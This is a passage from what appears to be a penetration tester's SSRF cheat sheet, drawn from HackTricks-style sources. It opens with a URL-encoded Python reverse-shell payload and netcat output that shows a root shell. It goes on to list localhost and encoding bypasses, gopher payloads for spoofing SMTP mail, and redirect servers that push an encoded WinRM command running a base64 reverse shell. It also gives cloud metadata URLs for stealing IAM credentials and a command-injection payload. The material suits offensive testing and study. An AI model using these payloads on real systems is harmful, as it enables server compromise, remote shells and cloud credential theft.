            http.open("GET","<http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527>", true);
            http.send();
            http.onerror = function(){document.write('<a>Oops!</a>');}
            </script>
        </body>
    </html>
    
    ```
    
    ```bash
    $ nc -nvlp 9090
    
    listening on [any] 9090 ...
    Connection received on 10.129.201.238 33100
    
    # whoami
    
    whoami
    root
    
    ```
    

# SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loop-back network interface. This will typically involve supplying a URL with a host-name like 127.0.0.1 (a reserved IP address that points to the loop-back adapter) or localhost.

### Basic Localhost Payloads

- Also try other encoding’s like HEX, Octal, Binary etc.
    
    ```python
    http://127.0.0.1:port
    http://localhost:port
    https://127.0.0.1:port
    https://localhost:port
    http://[::]:port
    http://0000::1:port
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://0/
    http://127.1
    http://127.0.1
    ```
    
1. Use Burp collaborater to check if the server is fetching data from an internal system
2. Send the request to a via a [localhost](http://localhost) payload
3. Try to perform sensitive actions as an unauthenticated user

### Bypasses for Localhost

```python
https://127.0.0.1/
https://localhost/
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com 
http://bugbounty.dod.network
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
http://1.1.1.1&@2.2.2.2
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
0://evil.com:80;http://google.com:80/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

# Bypass via open redirect

If the server is correctly protected you could **bypass all the restrictions by exploiting an Open Redirect inside the web page**. Because the webpage will allow **SSRF to the same domain** and probably will **follow redirects**, you can exploit the **Open Redirect to make the server to access internal any resource**.

# Protocols

- **file://**
    - The URL scheme `file://` is referenced, pointing directly to `/etc/passwd`: `file:///etc/passwd`
- **dict://**
    - The DICT URL scheme is described as being utilized for accessing definitions or word lists via the DICT protocol. An example given illustrates a constructed URL targeting a specific word, database, and entry number, as well as an instance of a PHP script being potentially misused to connect to a DICT server using attacker-provided credentials: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
    - Identified as a protocol for secure file transfer over secure shell, an example is provided showcasing how a PHP script could be exploited to connect to a malicious SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
    - Trivial File Transfer Protocol, operating over UDP, is mentioned with an example of a PHP script designed to send a request to a TFTP server. A TFTP request is made to 'generic.com' on port '12346' for the file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
    - This segment covers the Lightweight Directory Access Protocol, emphasizing its use for managing and accessing distributed directory information services over IP networks.Interact with an LDAP server on localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
    - A method is described for exploiting SSRF vulnerabilities to interact with SMTP services on localhost, including steps to reveal internal domain names and further investigative actions based on that information.
    
    [harisec on Twitter / X](https://twitter.com/har1sec/status/1182255952055164929)
    
    ```python
    1. connect with SSRF on smtp localhost:25
    2. from the first line get the internal domain name 220 http://blabla.internaldomain.com ESMTP Sendmail
    3. search http://internaldomain.com on github, find subdomains
    4. connect
    ```
    
- **Curl URL globbing - WAF bypass**
    - If the SSRF is executed by **curl**, curl has a feature called [**URL globbing**](https://everything.curl.dev/cmdline/globbing) that could be useful to bypass WAFs. For example in this [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) you can find this example for a **path traversal via `file` protocol**:
    - `file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}`

### Gopher://

Using this protocol you can specify the IP, port and bytes you want the server to send. Then, you can basically exploit a SSRF to communicate with any TCP server (but you need to know how to talk to the service first). Fortunately, you can use [Gopherus](https://github.com/tarunkant/Gopherus) to create payloads for several services. Additionally, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) can be used to create gopher payloads for Java RMI services.

**SMTP**

```python
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```

**HTTP**

```python
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

**SMTP — Back connect to 1337**

```python
# Attacker server
<?php
	header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

# Now query it
https://example.com/?q=http://evil.com/redirect.php
```

# SSRF Redirect to Gopher

For some exploitations you might need to **send a redirect response** (potentially to use a different protocol like gopher). Here you have different python codes to respond with a redirect:

```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("GET")
        self.send_response(301)
        self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
        self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)    

@app.route('/')    
def root():    
    return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)
    
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```

# SSRF via Referrer header & Others

Analytics software on servers often logs the Referrer header to track incoming links, a practice that inadvertently exposes applications to Server-Side Request Forgery (SSRF) vulnerabilities. This is because such software may visit external URLs mentioned in the Referrer header to analyze referral site content. To uncover these vulnerabilities, the Burp Suite plugin "**Collaborator Everywhere**" is advised, leveraging the way analytics tools process the Referer header to identify potential SSRF attack surfaces.

# SSRF via SNI data from certificate

A misconfiguration that could enable the connection to any backend through a simple setup is illustrated with an example Nginx configuration:

```python
stream {
    server {
        listen 443; 
        resolver 127.0.0.11;
        proxy_pass $ssl_preread_server_name:443;       
        ssl_preread on;
    }
}
```

In this configuration, the value from the Server Name Indication (SNI) field is directly utilized as the backend's address. This setup exposes a vulnerability to Server-Side Request Forgery (SSRF), which can be exploited by merely specifying the desired IP address or domain name in the SNI field. An exploitation example to force a connection to an arbitrary backend, such as [internal.host.com](http://internal.host.com/), using the openssl command is given below:

```python
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```

# WGET File Upload

[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick)

# SSRF with Command Injection

It might be worth trying a payload like: `url=http://id.burpcollaborator.net?`whoami``

# PDFs Rendering

If the web page is automatically creating a PDF with some information you have provided, you can **insert some JS that will be executed by the PDF creator** itself (the server) while creating the PDF and you will be able to abuse a SSRF. [**Find more information here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf).**

# From SSRF to DoS

Create several sessions and try to download heavy files exploiting the SSRF from the sessions.

# SSRF PHP Functions

[PHP SSRF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf)

# DNS Rebidding CORS/SOP bypass

If you are having **problems** to **exfiltrate content from a local IP** because of **CORS/SOP**, **DNS Rebidding** can be used to bypass that limitation: [CORS](CORS%20ac9038308b7e44aaa433d4fb4ca28f67.md) 

# Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is a tool to perform [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.

Check out also the **publicly running server in** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

# Time based SSRF

**Checking the time** of the responses from the server it might be **possible to know if a resource exists or not** (maybe it takes more time accessing an existing resource than accessing one that doesn't exist)

# SSRF URL for Cloud Instances

### AWS

```python
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
```

### Google Cloud

```python
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure

```python
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
```

### Digital Ocean

```python
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

### Oracle Cloud

```python
http://169.254.169.254/opc/v1/instance/
```

### Alibaba Cloud

```python
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/user-data
```

---

[SSRF (Server Side Request Forgery)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

[SSRF](https://kathan19.gitbook.io/howtohunt/ssrf/ssrf)